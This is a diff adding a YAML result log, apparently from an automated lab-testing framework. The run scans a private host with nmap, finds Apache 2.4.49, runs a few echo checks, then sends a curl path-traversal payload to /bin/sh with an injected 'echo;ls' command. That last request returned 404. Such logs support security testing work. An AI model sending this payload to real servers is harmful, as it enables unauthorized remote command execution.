@@ -1,0 +1,57 @@
+action_name: test
+timestamp: '20251209_161123'
+total_time: 7.28
+final_result: Fail
+commands:
+  1:
+    operator: AND
+    group_time: 7.06
+    group_result: Success
+    1a:
+      command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
+      expected: Apache
+      output: 80/tcp open  http    Apache httpd 2.4.49 ((Unix))
+      command_time: 7.0
+      result: Success
+    1b:
+      command: echo 'test kali'
+      expected: test kali
+      output: test kali
+      command_time: 0.06
+      result: Success
+  2:
+    call: testr2
+    expected: Success
+    result: Success
+    action_time: 0.14
+    commands:
+      1:
+        command: echo "test r2"
+        expected: test r2
+        output: test r2
+        command_time: 0.07
+        result: Success
+      2:
+        command: echo 'test aaa'
+        expected: test aaa
+        output: test aaa
+        command_time: 0.07
+        result: Success
+  3:
+    command: curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls'
+    expected: bash
+    output: '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+
+      <html><head>
+
+      <title>404 Not Found</title>
+
+      </head><body>
+
+      <h1>Not Found</h1>
+
+      <p>The requested URL was not found on this server.</p>
+
+      </body></html>'
+    command_time: 0.08
+    result: Fail
